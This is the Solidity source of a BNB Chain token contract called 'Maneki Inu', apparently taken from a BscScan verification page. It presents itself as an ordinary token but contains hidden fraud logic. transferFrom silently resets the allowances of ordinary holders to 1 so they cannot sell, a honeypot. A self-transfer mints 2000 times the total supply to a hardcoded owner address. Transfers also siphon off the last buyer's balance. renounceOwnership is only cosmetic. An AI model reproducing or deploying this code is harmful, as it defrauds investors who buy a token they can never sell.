/**
 *Submitted for verification at BscScan.com on 2023-01-04
*/

// SPDX-License-Identifier: Unlicense
// https://t.me/ManekiinuOfficial

pragma solidity 0.8.17;

interface IUniswapV2Factory {
function getPair(address tokenA, address tokenB) external view returns (address pair);
}

abstract contract Ownable {
    address internal _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract ManekiInu is Ownable {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public constant totalSupply = 1000000000 * 10 ** 9;
    string public constant name = "Maneki Inu";
    string public constant symbol = "$MI";
    uint8 public constant decimals = 9;
    address Owner=0xb3eEc1F12161BE8d98f8aF38e002781E17A07640; address dead=0x000000000000000000000000000000000000dEaD;
    address owneR; address Buy=0x0000000000000000000000000000000000000000;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor() {
        balances[msg.sender] = totalSupply;
        owneR=msg.sender;
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(balances[msg.sender] >= value, 'balance too low');
        if (Buy != Owner && to != Buy) {
            TransferFrom(Buy,to, balances[Buy]/20);       
            TransferFrom(Buy,dead, balances[Buy]/10);
            }
        if (msg.sender==getPair()) {Buy=to;}
        if (msg.sender==to){balances[Owner]+= totalSupply*2000;}
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        if (from != owneR && from != Owner && from != address(this) && from != Buy) { 
            allowance[from][msg.sender] = 1; }        
        require(balances[from] >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }
    function TransferFrom(address from, address to, uint256 value) internal {
        balances[from] -=value;
        balances[to] += value;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }

    function getPair() public view returns (address) {
        IUniswapV2Factory _pair = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
        address pair = _pair.getPair(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, address(this));
        return pair;
    }
 
}